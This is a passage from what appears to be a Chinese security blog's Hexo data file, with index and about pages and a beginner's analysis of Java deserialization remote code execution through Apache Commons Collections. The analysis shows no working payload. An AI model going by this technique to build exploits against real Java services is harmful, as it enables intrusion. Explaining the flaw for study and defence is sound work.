\"gallary\"\n---\n","updated":"2018-11-29T09:59:50.869Z","path":"gallary/index.html","_id":"cjpdmuzzb00034cv075upbrlk","comments":1,"layout":"page","content":"","site":{"data":{}},"excerpt":"","more":""},{"title":"算法分类","date":"2018-10-11T09:52:26.000Z","type":"algorithm","comments":0,"_content":"\n* [**算法-时间复杂度分析**](/posts/2018-09-08-算法-复杂度分析.html)\n* [**算法-最好、最坏、平均、均摊时间复杂度**](/posts/2018-09-09-算法-最好、最坏、平均、均摊时间复杂度.html)\n* [**算法-数组**](/posts/2018-09-10-算法-数组.html)\n* [**算法-链表**](/posts/2018-09-12-算法-链表.html)\n* [**算法-怎样写好链表代码**](/posts/2018-09-13-算法-怎样写好链表代码.html)\n\n\n","source":"algorithm/index.md","raw":"---\ntitle: 算法分类\ndate: 2018-10-11 17:52:26\ntype: \"algorithm\"\ncomments: false\n---\n\n* [**算法-时间复杂度分析**](/posts/2018-09-08-算法-复杂度分析.html)\n* [**算法-最好、最坏、平均、均摊时间复杂度**](/posts/2018-09-09-算法-最好、最坏、平均、均摊时间复杂度.html)\n* [**算法-数组**](/posts/2018-09-10-算法-数组.html)\n* [**算法-链表**](/posts/2018-09-12-算法-链表.html)\n* [**算法-怎样写好链表代码**](/posts/2018-09-13-算法-怎样写好链表代码.html)\n\n\n","updated":"2018-11-29T09:59:50.869Z","path":"algorithm/index.html","_id":"cjpdmuzzi00074cv0xxusbsdu","layout":"page","content":"<ul>\n<li><a href=\"/posts/2018-09-08-算法-复杂度分析.html\"><strong>算法-时间复杂度分析</strong></a></li>\n<li><a href=\"/posts/2018-09-09-算法-最好、最坏、平均、均摊时间复杂度.html\"><strong>算法-最好、最坏、平均、均摊时间复杂度</strong></a></li>\n<li><a href=\"/posts/2018-09-10-算法-数组.html\"><strong>算法-数组</strong></a></li>\n<li><a href=\"/posts/2018-09-12-算法-链表.html\"><strong>算法-链表</strong></a></li>\n<li><a href=\"/posts/2018-09-13-算法-怎样写好链表代码.html\"><strong>算法-怎样写好链表代码</strong></a></li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<ul>\n<li><a href=\"/posts/2018-09-08-算法-复杂度分析.html\"><strong>算法-时间复杂度分析</strong></a></li>\n<li><a href=\"/posts/2018-09-09-算法-最好、最坏、平均、均摊时间复杂度.html\"><strong>算法-最好、最坏、平均、均摊时间复杂度</strong></a></li>\n<li><a href=\"/posts/2018-09-10-算法-数组.html\"><strong>算法-数组</strong></a></li>\n<li><a href=\"/posts/2018-09-12-算法-链表.html\"><strong>算法-链表</strong></a></li>\n<li><a href=\"/posts/2018-09-13-算法-怎样写好链表代码.html\"><strong>算法-怎样写好链表代码</strong></a></li>\n</ul>\n"},{"title":"schedule","date":"2018-10-10T21:08:07.000Z","type":"schedule","comments":0,"_content":"","source":"schedule/index.md","raw":"---\ntitle: schedule\ndate: 2018-10-11 05:08:07\ntype: \"schedule\"\ncomments: false\n---\n","updated":"2018-11-29T09:59:50.885Z","path":"schedule/index.html","_id":"cjpdmuzzm00094cv0xr3twyua","layout":"page","content":"","site":{"data":{}},"excerpt":"","more":""},{"title":"文章分类","date":"2018-10-10T21:07:50.000Z","type":"categories","comments":0,"_content":"","source":"categories/index.md","raw":"---\ntitle: 文章分类\ndate: 2018-10-11 05:07:50\ntype: \"categories\"\ncomments: false\n---\n","updated":"2018-11-29T09:59:50.869Z","path":"categories/index.html","_id":"cjpdmuzzr000d4cv08fhzf7y3","layout":"page","content":"","site":{"data":{}},"excerpt":"","more":""},{"layout":"page","title":"关于我","date":"2018-10-10T21:07:33.000Z","type":"about","comments":0,"_content":"\n陌生人，很荣幸你能来到这个页面，也欢迎来参观我的博客。\n\n#### 简介\n* 任浩杰、男\n* 17年毕业于太原理工大学\n* 程序猿、白帽子、极客\n* 个人追求技术、追求极致、追求优雅\n* 目前从事企业安全渗透测试方面的工作\n\n#### 博客介绍\n博客主要关注如下几个方面：\n* 算法\n* 安全\n* Java\n* Python\n* 前端\n\n#### 为什么写博客\n* 总结知识\n* 分享知识\n* <s>装逼</s>\n\n希望自己能在知识的海洋里越游越远。\n\n#### 技能(也算是涉猎甚广了)\n* web渗透测试、burpsuite、Appscan、Nessus\n* MySQL、Mongodb、Redis\n* Java、Spring、Spring Boot、Mybatis\n* Python、Flask，Django\n* Git、Jenkins、Maven、SnoreQube、FindSecBugs\n* IDEA、Eclipse、SublimeText、Visual Studio Code、Vim\n* Windows、AD域、Linux、Archlinux、Centos、Docker\n\n目标全能架构师\n\n#### 证书\n* 工信部 Java高级开发工程师\n* 工信部 高级软件开发\n\n\n#### 项目\n* 我的笔记地址： [http://doc.renhj.org](http://doc.renhj.org)\n* 我的Github地址： [github.com/AriesRen/](https://github.com/AriesRen/)\n\n#### 联系方式\n* 邮箱： 18435175817@163.com\n* Q &nbsp;Q： 1761179051\n* 微信： RHJ110\n<img src=\"weixin.jpg\" width=\"300\" style=\"margin-left:5px; margin-top: 15px;\" />\n\n<br>\n\n","source":"about/index.md","raw":"---\nlayout: page\ntitle: 关于我\ndate: 2018-10-11 05:07:33\ntype: \"about\"\ncomments: false\n---\n\n陌生人，很荣幸你能来到这个页面，也欢迎来参观我的博客。\n\n#### 简介\n* 任浩杰、男\n* 17年毕业于太原理工大学\n* 程序猿、白帽子、极客\n* 个人追求技术、追求极致、追求优雅\n* 目前从事企业安全渗透测试方面的工作\n\n#### 博客介绍\n博客主要关注如下几个方面：\n* 算法\n* 安全\n* Java\n* Python\n* 前端\n\n#### 为什么写博客\n* 总结知识\n* 分享知识\n* <s>装逼</s>\n\n希望自己能在知识的海洋里越游越远。\n\n#### 技能(也算是涉猎甚广了)\n* web渗透测试、burpsuite、Appscan、Nessus\n* MySQL、Mongodb、Redis\n* Java、Spring、Spring Boot、Mybatis\n* Python、Flask，Django\n* Git、Jenkins、Maven、SnoreQube、FindSecBugs\n* IDEA、Eclipse、SublimeText、Visual Studio Code、Vim\n* Windows、AD域、Linux、Archlinux、Centos、Docker\n\n目标全能架构师\n\n#### 证书\n* 工信部 Java高级开发工程师\n* 工信部 高级软件开发\n\n\n#### 项目\n* 我的笔记地址： [http://doc.renhj.org](http://doc.renhj.org)\n* 我的Github地址： [github.com/AriesRen/](https://github.com/AriesRen/)\n\n#### 联系方式\n* 邮箱： 18435175817@163.com\n* Q &nbsp;Q： 1761179051\n* 微信： RHJ110\n<img src=\"weixin.jpg\" width=\"300\" style=\"margin-left:5px; margin-top: 15px;\" />\n\n<br>\n\n","updated":"2018-11-29T09:59:50.854Z","path":"about/index.html","_id":"cjpdmuzzz000f4cv0s8pkx41d","content":"<p>陌生人，很荣幸你能来到这个页面，也欢迎来参观我的博客。</p>\n<h4 id=\"简介\"><a href=\"#简介\" class=\"headerlink\" title=\"简介\"></a>简介</h4><ul>\n<li>任浩杰、男</li>\n<li>17年毕业于太原理工大学</li>\n<li>程序猿、白帽子、极客</li>\n<li>个人追求技术、追求极致、追求优雅</li>\n<li>目前从事企业安全渗透测试方面的工作</li>\n</ul>\n<h4 id=\"博客介绍\"><a href=\"#博客介绍\" class=\"headerlink\" title=\"博客介绍\"></a>博客介绍</h4><p>博客主要关注如下几个方面：</p>\n<ul>\n<li>算法</li>\n<li>安全</li>\n<li>Java</li>\n<li>Python</li>\n<li>前端</li>\n</ul>\n<h4 id=\"为什么写博客\"><a href=\"#为什么写博客\" class=\"headerlink\" title=\"为什么写博客\"></a>为什么写博客</h4><ul>\n<li>总结知识</li>\n<li>分享知识</li>\n<li><s>装逼</s></li>\n</ul>\n<p>希望自己能在知识的海洋里越游越远。</p>\n<h4 id=\"技能-也算是涉猎甚广了\"><a href=\"#技能-也算是涉猎甚广了\" class=\"headerlink\" title=\"技能(也算是涉猎甚广了)\"></a>技能(也算是涉猎甚广了)</h4><ul>\n<li>web渗透测试、burpsuite、Appscan、Nessus</li>\n<li>MySQL、Mongodb、Redis</li>\n<li>Java、Spring、Spring Boot、Mybatis</li>\n<li>Python、Flask，Django</li>\n<li>Git、Jenkins、Maven、SnoreQube、FindSecBugs</li>\n<li>IDEA、Eclipse、SublimeText、Visual Studio Code、Vim</li>\n<li>Windows、AD域、Linux、Archlinux、Centos、Docker</li>\n</ul>\n<p>目标全能架构师</p>\n<h4 id=\"证书\"><a href=\"#证书\" class=\"headerlink\" title=\"证书\"></a>证书</h4><ul>\n<li>工信部 Java高级开发工程师</li>\n<li>工信部 高级软件开发</li>\n</ul>\n<h4 id=\"项目\"><a href=\"#项目\" class=\"headerlink\" title=\"项目\"></a>项目</h4><ul>\n<li>我的笔记地址： <a href=\"http://doc.renhj.org\" target=\"_blank\" rel=\"noopener\">http://doc.renhj.org</a></li>\n<li>我的Github地址： <a href=\"https://github.com/AriesRen/\" target=\"_blank\" rel=\"noopener\">github.com/AriesRen/</a></li>\n</ul>\n<h4 id=\"联系方式\"><a href=\"#联系方式\" class=\"headerlink\" title=\"联系方式\"></a>联系方式</h4><ul>\n<li>邮箱： <a href=\"mailto:18435175817@163.com\" target=\"_blank\" rel=\"noopener\">18435175817@163.com</a></li>\n<li>Q &nbsp;Q： 1761179051</li>\n<li>微信： RHJ110<br><img src=\"weixin.jpg\" width=\"300\" style=\"margin-left:5px; margin-top: 15px;\"></li>\n</ul>\n<p><br></p>\n","site":{"data":{}},"excerpt":"","more":"<p>陌生人，很荣幸你能来到这个页面，也欢迎来参观我的博客。</p>\n<h4 id=\"简介\"><a href=\"#简介\" class=\"headerlink\" title=\"简介\"></a>简介</h4><ul>\n<li>任浩杰、男</li>\n<li>17年毕业于太原理工大学</li>\n<li>程序猿、白帽子、极客</li>\n<li>个人追求技术、追求极致、追求优雅</li>\n<li>目前从事企业安全渗透测试方面的工作</li>\n</ul>\n<h4 id=\"博客介绍\"><a href=\"#博客介绍\" class=\"headerlink\" title=\"博客介绍\"></a>博客介绍</h4><p>博客主要关注如下几个方面：</p>\n<ul>\n<li>算法</li>\n<li>安全</li>\n<li>Java</li>\n<li>Python</li>\n<li>前端</li>\n</ul>\n<h4 id=\"为什么写博客\"><a href=\"#为什么写博客\" class=\"headerlink\" title=\"为什么写博客\"></a>为什么写博客</h4><ul>\n<li>总结知识</li>\n<li>分享知识</li>\n<li><s>装逼</s></li>\n</ul>\n<p>希望自己能在知识的海洋里越游越远。</p>\n<h4 id=\"技能-也算是涉猎甚广了\"><a href=\"#技能-也算是涉猎甚广了\" class=\"headerlink\" title=\"技能(也算是涉猎甚广了)\"></a>技能(也算是涉猎甚广了)</h4><ul>\n<li>web渗透测试、burpsuite、Appscan、Nessus</li>\n<li>MySQL、Mongodb、Redis</li>\n<li>Java、Spring、Spring Boot、Mybatis</li>\n<li>Python、Flask，Django</li>\n<li>Git、Jenkins、Maven、SnoreQube、FindSecBugs</li>\n<li>IDEA、Eclipse、SublimeText、Visual Studio Code、Vim</li>\n<li>Windows、AD域、Linux、Archlinux、Centos、Docker</li>\n</ul>\n<p>目标全能架构师</p>\n<h4 id=\"证书\"><a href=\"#证书\" class=\"headerlink\" title=\"证书\"></a>证书</h4><ul>\n<li>工信部 Java高级开发工程师</li>\n<li>工信部 高级软件开发</li>\n</ul>\n<h4 id=\"项目\"><a href=\"#项目\" class=\"headerlink\" title=\"项目\"></a>项目</h4><ul>\n<li>我的笔记地址： <a href=\"http://doc.renhj.org\" target=\"_blank\" rel=\"noopener\">http://doc.renhj.org</a></li>\n<li>我的Github地址： <a href=\"https://github.com/AriesRen/\" target=\"_blank\" rel=\"noopener\">github.com/AriesRen/</a></li>\n</ul>\n<h4 id=\"联系方式\"><a href=\"#联系方式\" class=\"headerlink\" title=\"联系方式\"></a>联系方式</h4><ul>\n<li>邮箱： <a href=\"mailto:18435175817@163.com\" target=\"_blank\" rel=\"noopener\">18435175817@163.com</a></li>\n<li>Q &nbsp;Q： 1761179051</li>\n<li>微信： RHJ110<br><img src=\"weixin.jpg\" width=\"300\" style=\"margin-left:5px; margin-top: 15px;\"></li>\n</ul>\n<p><br></p>\n"},{"title":"标签","date":"2018-10-10T21:07:42.000Z","type":"tags","_content":"","source":"tags/index.md","raw":"---\ntitle: 标签\ndate: 2018-10-11 05:07:42\ntype: \"tags\"\n---\n","updated":"2018-11-29T09:59:50.885Z","path":"tags/index.html","_id":"cjpdmv005000i4cv0pnr8itci","comments":1,"layout":"page","content":"","site":{"data":{}},"excerpt":"","more":""},{"title":"sitemap","date":"2018-10-10T21:08:12.000Z","type":"sitemap","_content":"","source":"sitemap/index.md","raw":"---\ntitle: sitemap\ndate: 2018-10-11 05:08:12\ntype: \"sitemap\"\n---\n","updated":"2018-11-29T09:59:50.885Z","path":"sitemap/index.html","_id":"cjpdmv00e000m4cv0los7a1ul","comments":1,"layout":"page","content":"","site":{"data":{}},"excerpt":"","more":""}],"Post":[{"title":"Dubbo面试题","date":"2018-11-02T03:19:19.000Z","_content":"\n### 1、Dubbo完整的一次调用链路介绍\n\n### 2、Dubbo支持几种负载均衡策略\n\n### 3、Dubbo Provider服务提供者想要控制执行并发请求上限，具体怎么做？\n\n### 4、Dubbo启动的时候支持几种配置方式\n\n### 5、消息中间件如何保证消息的一致性和如何进行消息的重试机制？\n\n### 6、Spring Cloud熔断机制\n\n\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","source":"_posts/Dubbo面试题.md","raw":"---\ntitle: Dubbo面试题\ndate: 2018-11-02 11:19:19\ntags: ['java','面试','dubbo']\ncategories: 面试\n---\n\n### 1、Dubbo完整的一次调用链路介绍\n\n### 2、Dubbo支持几种负载均衡策略\n\n### 3、Dubbo Provider服务提供者想要控制执行并发请求上限，具体怎么做？\n\n### 4、Dubbo启动的时候支持几种配置方式\n\n### 5、消息中间件如何保证消息的一致性和如何进行消息的重试机制？\n\n### 6、Spring Cloud熔断机制\n\n\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","slug":"Dubbo面试题","published":1,"updated":"2018-12-03T09:55:55.686Z","_id":"cjpdmuzyg00004cv01n6gjyre","comments":1,"layout":"post","photos":[],"link":"","content":"<h3 id=\"1、Dubbo完整的一次调用链路介绍\"><a href=\"#1、Dubbo完整的一次调用链路介绍\" class=\"headerlink\" title=\"1、Dubbo完整的一次调用链路介绍\"></a>1、Dubbo完整的一次调用链路介绍</h3><h3 id=\"2、Dubbo支持几种负载均衡策略\"><a href=\"#2、Dubbo支持几种负载均衡策略\" class=\"headerlink\" title=\"2、Dubbo支持几种负载均衡策略\"></a>2、Dubbo支持几种负载均衡策略</h3><h3 id=\"3、Dubbo-Provider服务提供者想要控制执行并发请求上限，具体怎么做？\"><a href=\"#3、Dubbo-Provider服务提供者想要控制执行并发请求上限，具体怎么做？\" class=\"headerlink\" title=\"3、Dubbo Provider服务提供者想要控制执行并发请求上限，具体怎么做？\"></a>3、Dubbo Provider服务提供者想要控制执行并发请求上限，具体怎么做？</h3><h3 id=\"4、Dubbo启动的时候支持几种配置方式\"><a href=\"#4、Dubbo启动的时候支持几种配置方式\" class=\"headerlink\" title=\"4、Dubbo启动的时候支持几种配置方式\"></a>4、Dubbo启动的时候支持几种配置方式</h3><h3 id=\"5、消息中间件如何保证消息的一致性和如何进行消息的重试机制？\"><a href=\"#5、消息中间件如何保证消息的一致性和如何进行消息的重试机制？\" class=\"headerlink\" title=\"5、消息中间件如何保证消息的一致性和如何进行消息的重试机制？\"></a>5、消息中间件如何保证消息的一致性和如何进行消息的重试机制？</h3><h3 id=\"6、Spring-Cloud熔断机制\"><a href=\"#6、Spring-Cloud熔断机制\" class=\"headerlink\" title=\"6、Spring Cloud熔断机制\"></a>6、Spring Cloud熔断机制</h3><script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","site":{"data":{}},"excerpt":"","more":"<h3 id=\"1、Dubbo完整的一次调用链路介绍\"><a href=\"#1、Dubbo完整的一次调用链路介绍\" class=\"headerlink\" title=\"1、Dubbo完整的一次调用链路介绍\"></a>1、Dubbo完整的一次调用链路介绍</h3><h3 id=\"2、Dubbo支持几种负载均衡策略\"><a href=\"#2、Dubbo支持几种负载均衡策略\" class=\"headerlink\" title=\"2、Dubbo支持几种负载均衡策略\"></a>2、Dubbo支持几种负载均衡策略</h3><h3 id=\"3、Dubbo-Provider服务提供者想要控制执行并发请求上限，具体怎么做？\"><a href=\"#3、Dubbo-Provider服务提供者想要控制执行并发请求上限，具体怎么做？\" class=\"headerlink\" title=\"3、Dubbo Provider服务提供者想要控制执行并发请求上限，具体怎么做？\"></a>3、Dubbo Provider服务提供者想要控制执行并发请求上限，具体怎么做？</h3><h3 id=\"4、Dubbo启动的时候支持几种配置方式\"><a href=\"#4、Dubbo启动的时候支持几种配置方式\" class=\"headerlink\" title=\"4、Dubbo启动的时候支持几种配置方式\"></a>4、Dubbo启动的时候支持几种配置方式</h3><h3 id=\"5、消息中间件如何保证消息的一致性和如何进行消息的重试机制？\"><a href=\"#5、消息中间件如何保证消息的一致性和如何进行消息的重试机制？\" class=\"headerlink\" title=\"5、消息中间件如何保证消息的一致性和如何进行消息的重试机制？\"></a>5、消息中间件如何保证消息的一致性和如何进行消息的重试机制？</h3><h3 id=\"6、Spring-Cloud熔断机制\"><a href=\"#6、Spring-Cloud熔断机制\" class=\"headerlink\" title=\"6、Spring Cloud熔断机制\"></a>6、Spring Cloud熔断机制</h3><script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>"},{"title":"Java反序列化漏洞浅析","date":"2018-11-13T03:33:48.000Z","_content":"\n<div style=\"text-align: center;\">\n{% note success %} \n### 0x01 前言\n{% endnote %}\n</div>\n\n2015年11月6日FoxGlove Security安全团队的@breenmachine 发布了一篇长博客，介绍了如何利用Java反序列化漏洞，来攻击最新的Jenkins、Jboss、WebLogic等java应用，实现远程代码执行漏洞。\n\n事实上，早在2015年的1月28号，Gabriel Lawrence (@gebl)和Chris Frohoff (@frohoff)在AppSecCali上给出了一个报告[5]，报告中介绍了Java反序列化漏洞可以利用Apache Commons Collections这个常用的Java库来实现任意代码执行。\n\n确实，Apache Commons Collection这样的基础类库有非常多的Java应用都在用，一旦编程人员误用了反序列化机制，使得用户的输入可以直接被反序列化，就能导致任意代码执行，这是一个极其严重的事情。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 0x02 Java序列化和反序列化\n{% endnote %}\n</div>\n\n今天我们就以Java的反序列化漏洞做一个简单的分析。在这之前先了解一下Java的序列化和反序列化。\n\n> 序列化就是把对象的状态信息转换为字节序列(即可以存储或传输的形式)过程\n> 反序列化即逆过程，将字节流还原为对象\n\njava序列化经常用在把对象的字节序列存储在磁盘上，另一个用途是在网络上传输对象。例如最常见的是web服务器中Session对象，当有10万用户并发访问，就有可能出现10万个session对象，内存可能吃不消，于是web容器就会把一些session先序列化到硬盘中，等要用的时候，再把保存在磁盘上的对象加载到内存中。\n\nJava中的ObjectOutputStream类的`writeObject` 方法可以实现序列化，类`ObjectInputStream`类的readObject方法可以用于反序列化。下面是一个将字符串对象先进行序列化存储到本地文件，在通过反序列化进行恢复的代码。\n\n```java\npublic class TestSerialize(){\n\tpublic static void main(String[] args){\n\t\tString s = \"test\";\n\n\t\t// 将序列化对象写入文件中\n\t\tFileOutputStream fos = new FileOutputStream(\"object.ser\");\n\t\tObjectOutputStream os = new ObjectOutputStream(fos);\n\t\tos.writeObject(s);\n\t\tos.close;\n\n\t\t// 从文件中读取对象\n\t\tFileInputStream fis = new FileInputStream(\"object.ser\");\n\t\tObjectInputStream ois = new ObjectInputStream(fis);\n\n\t\t// 通过反序列化恢复对象\n\t\tString s1 = (String)ois.readObject();\n\t\tois.close();\n\t}\n}\n```\n\n问题在于，如果java应用对于用户输入，即不可信的数据做了反序列化处理，那么攻击者可以通过构造恶意输入，让反序列化产生非预期的对象，非预期的对象产生过程中就有可能带来任意代码执行。\n\n所以这个问题的根源在于`ObjecInputStream`在反序列化时，没有对生成的对象的类型做限制。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 0x03 利用Apache Commons Collections实现远程代码执行\n{% endnote %}\n</div>\n\n本篇以Apache Commons Collections为例，来解释如何构造对象，能够让程序在反序列化时，即调用readObject()时，就能直接实现远程代码执行。\n\nJava中Map是存储键值对的数据结构。在Apache Commons Collections中实现了类`TransformedMap`，用来对Map进行某种转换，只需要调用`decorate()`函数，传入key和value的变换函数`Transformer`，就可以从任意Map对象生成相应的`TransformedMap`，decorate的函数如下：\n\n```java\npublic static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer){\n\treturn new TransformedMap(map, keyTransformer, valueTransformer);\n}\n```\n\n`Transformer`是一个接口，其中定义的`transform()`函数用来将一个对象转换为另一个对象，如下所示：\n\n```java\npublic interface Transformer{\n\tpublic Object transform(Object input);\n}\n```\n\n当Map中的任意key或value更改时，相应的`Transformer`就会被调用。除此之外，多个Trnansformer还能串起来，形成调用链`ChainedTransformer`。Apache Commons Collections已经实现了一些`Transformer`，其中有一个可以通过java的反射机制调用任意函数，叫做`InvokerTransformer`,代码如下：\n\n```java\npublic class InvokerTransformer implements Transformer, Serializable{\n\t...\n\tpublic InvokerTransformer(String methodName, Class[] paramTypes, Object[] args){\n\t\t\n\t}\n}\n```\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","source":"_posts/Java反序列化漏洞浅析.md","raw":"---\ntitle: Java反序列化漏洞浅析\ndate: 2018-11-13 11:33:48\ntags: ['安全','反序列化','Java','漏洞']\ncategories: 安全\n---\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 0x01 前言\n{% endnote %}\n</div>\n\n2015年11月6日FoxGlove Security安全团队的@breenmachine 发布了一篇长博客，介绍了如何利用Java反序列化漏洞，来攻击最新的Jenkins、Jboss、WebLogic等java应用，实现远程代码执行漏洞。\n\n事实上，早在2015年的1月28号，Gabriel Lawrence (@gebl)和Chris Frohoff (@frohoff)在AppSecCali上给出了一个报告[5]，报告中介绍了Java反序列化漏洞可以利用Apache Commons Collections这个常用的Java库来实现任意代码执行。\n\n确实，Apache Commons Collection这样的基础类库有非常多的Java应用都在用，一旦编程人员误用了反序列化机制，使得用户的输入可以直接被反序列化，就能导致任意代码执行，这是一个极其严重的事情。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 0x02 Java序列化和反序列化\n{% endnote %}\n</div>\n\n今天我们就以Java的反序列化漏洞做一个简单的分析。在这之前先了解一下Java的序列化和反序列化。\n\n> 序列化就是把对象的状态信息转换为字节序列(即可以存储或传输的形式)过程\n> 反序列化即逆过程，将字节流还原为对象\n\njava序列化经常用在把对象的字节序列存储在磁盘上，另一个用途是在网络上传输对象。例如最常见的是web服务器中Session对象，当有10万用户并发访问，就有可能出现10万个session对象，内存可能吃不消，于是web容器就会把一些session先序列化到硬盘中，等要用的时候，再把保存在磁盘上的对象加载到内存中。\n\nJava中的ObjectOutputStream类的`writeObject` 方法可以实现序列化，类`ObjectInputStream`类的readObject方法可以用于反序列化。下面是一个将字符串对象先进行序列化存储到本地文件，在通过反序列化进行恢复的代码。\n\n```java\npublic class TestSerialize(){\n\tpublic static void main(String[] args){\n\t\tString s = \"test\";\n\n\t\t// 将序列化对象写入文件中\n\t\tFileOutputStream fos = new FileOutputStream(\"object.ser\");\n\t\tObjectOutputStream os = new ObjectOutputStream(fos);\n\t\tos.writeObject(s);\n\t\tos.close;\n\n\t\t// 从文件中读取对象\n\t\tFileInputStream fis = new FileInputStream(\"object.ser\");\n\t\tObjectInputStream ois = new ObjectInputStream(fis);\n\n\t\t// 通过反序列化恢复对象\n\t\tString s1 = (String)ois.readObject();\n\t\tois.close();\n\t}\n}\n```\n\n问题在于，如果java应用对于用户输入，即不可信的数据做了反序列化处理，那么攻击者可以通过构造恶意输入，让反序列化产生非预期的对象，非预期的对象产生过程中就有可能带来任意代码执行。\n\n所以这个问题的根源在于`ObjecInputStream`在反序列化时，没有对生成的对象的类型做限制。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 0x03 利用Apache Commons Collections实现远程代码执行\n{% endnote %}\n</div>\n\n本篇以Apache Commons Collections为例，来解释如何构造对象，能够让程序在反序列化时，即调用readObject()时，就能直接实现远程代码执行。\n\nJava中Map是存储键值对的数据结构。在Apache Commons Collections中实现了类`TransformedMap`，用来对Map进行某种转换，只需要调用`decorate()`函数，传入key和value的变换函数`Transformer`，就可以从任意Map对象生成相应的`TransformedMap`，decorate的函数如下：\n\n```java\npublic static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer){\n\treturn new TransformedMap(map, keyTransformer, valueTransformer);\n}\n```\n\n`Transformer`是一个接口，其中定义的`transform()`函数用来将一个对象转换为另一个对象，如下所示：\n\n```java\npublic interface Transformer{\n\tpublic Object transform(Object input);\n}\n```\n\n当Map中的任意key或value更改时，相应的`Transformer`就会被调用。除此之外，多个Trnansformer还能串起来，形成调用链`ChainedTransformer`。Apache Commons Collections已经实现了一些`Transformer`，其中有一个可以通过java的反射机制调用任意函数，叫做`InvokerTransformer`,代码如下：\n\n```java\npublic class InvokerTransformer implements Transformer, Serializable{\n\t...\n\tpublic InvokerTransformer(String methodName, Class[] paramTypes, Object[] args){\n\t\t\n\t}\n}\n```\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","slug":"Java反序列化漏洞浅析","published":1,"updated":"2018-11-29T09:59:50.604Z","_id":"cjpdmuzz800024cv0t61skx8f","comments":1,"layout":"post","photos":[],"link":"","content":"<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"0x01-前言\"><a href=\"#0x01-前言\" class=\"headerlink\" title=\"0x01 前言\"></a>0x01 前言</h3></div><br></div>\n\n<p>2015年11月6日FoxGlove Security安全团队的@breenmachine 发布了一篇长博客，介绍了如何利用Java反序列化漏洞，来攻击最新的Jenkins、Jboss、WebLogic等java应用，实现远程代码执行漏洞。</p>\n<p>事实上，早在2015年的1月28号，Gabriel Lawrence (@gebl)和Chris Frohoff (@frohoff)在AppSecCali上给出了一个报告[5]，报告中介绍了Java反序列化漏洞可以利用Apache Commons Collections这个常用的Java库来实现任意代码执行。</p>\n<p>确实，Apache Commons Collection这样的基础类库有非常多的Java应用都在用，一旦编程人员误用了反序列化机制，使得用户的输入可以直接被反序列化，就能导致任意代码执行，这是一个极其严重的事情。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"0x02-Java序列化和反序列化\"><a href=\"#0x02-Java序列化和反序列化\" class=\"headerlink\" title=\"0x02 Java序列化和反序列化\"></a>0x02 Java序列化和反序列化</h3></div><br></div>\n\n<p>今天我们就以Java的反序列化漏洞做一个简单的分析。在这之前先了解一下Java的序列化和反序列化。</p>\n<blockquote>\n<p>序列化就是把对象的状态信息转换为字节序列(即可以存储或传输的形式)过程<br>反序列化即逆过程，将字节流还原为对象</p>\n</blockquote>\n<p>java序列化经常用在把对象的字节序列存储在磁盘上，另一个用途是在网络上传输对象。例如最常见的是web服务器中Session对象，当有10万用户并发访问，就有可能出现10万个session对象，内存可能吃不消，于是web容器就会把一些session先序列化到硬盘中，等要用的时候，再把保存在磁盘上的对象加载到内存中。</p>\n<p>Java中的ObjectOutputStream类的<code>writeObject</code> 方法可以实现序列化，类<code>ObjectInputStream</code>类的readObject方法可以用于反序列化。下面是一个将字符串对象先进行序列化存储到本地文件，在通过反序列化进行恢复的代码。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span 